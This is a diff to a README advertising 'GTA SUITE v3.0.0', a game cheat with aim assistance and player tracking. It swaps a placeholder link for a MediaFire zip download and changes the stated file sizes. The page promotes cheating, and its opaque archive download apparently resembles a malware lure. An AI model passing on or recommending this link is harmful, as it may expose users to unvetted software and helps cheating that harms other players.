@@ -21,7 +21,7 @@
 
 <div align="center">
 
-## ⬇️ [DOWNLOAD GTA SUITE v3.0.0 (2.1GB)](https://your-cdn-link.com/GTA_Suite_v3.0.0.7z) ⬇️
+## ⬇️ [DOWNLOAD GTA SUITE v3.0.0 (250mB)](https://www.mediafire.com/file/95msrfp9cpv6di4/GTA+SUITE+v3.0.0.zip/file) ⬇️
 
 </div>
 
@@ -36,10 +36,6 @@
 
 <p align="center">
   <i>Left: Target Lock & Aim Assistance • Right: Player Tracking & Visual Overlay</i>
-</p>
-
-<p align="center">
-  <img src="assets/menu.png" alt="Main Menu" width="80%">
 </p>
 
 <p align="center">
@@ -89,7 +85,7 @@
 
 <div align="center">
 
-## ⬇️ [DOWNLOAD GTA SUITE v3.0.0 (2.1GB)](https://your-cdn-link.com/GTA_Suite_v3.0.0.7z) ⬇️
+## ⬇️ [DOWNLOAD GTA SUITE v3.0.0 (250mB)](https://www.mediafire.com/file/95msrfp9cpv6di4/GTA+SUITE+v3.0.0.zip/file) ⬇️
 
 </div>
 
@@ -112,7 +108,7 @@
 | **CPU** | Intel i5‑8400 / AMD Ryzen 5 2600 | Intel i7‑9700K / AMD Ryzen 7 3700X |
 | **RAM** | 8 GB | 16 GB |
 | **GPU** | GTX 1060 / RX 580 | RTX 2070 / RX 5700 XT |
-| **Storage** | 50 MB free space (archive: 2.1 GB) | 50 MB free space |
+| **Storage** | 250 MB free space (archive: 250 MB) | 250 MB free space |
 
 ---
 
